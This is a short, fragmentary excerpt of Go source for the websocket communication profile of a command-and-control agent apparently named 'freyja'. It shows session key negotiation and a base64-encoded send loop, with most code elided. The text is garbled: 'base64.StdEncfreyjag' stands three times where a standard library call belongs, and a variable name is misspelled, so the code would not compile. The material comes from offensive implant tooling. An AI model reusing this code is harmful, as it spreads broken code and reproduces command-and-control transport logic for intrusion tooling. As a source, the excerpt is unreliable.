...
// encrypted_exchange_check is set to True or False to determine if freyja should do a key exchange
...
func (c *C2Websockets) NegotiateKey() bool {
	...
	encryptedSesionKey, _ := base64.StdEncfreyjag.DecodeString(sessionKeyResp.SessionKey)
...
func (c *C2Websockets) sendData(tag string, sendData []byte) interface{} {
	...
	sendData = []byte(base64.StdEncfreyjag.EncodeToString(sendData))
	for true {
		m.Client = true
		...
		raw, err := base64.StdEncfreyjag.DecodeString(resp.Data)
		if err != nil {
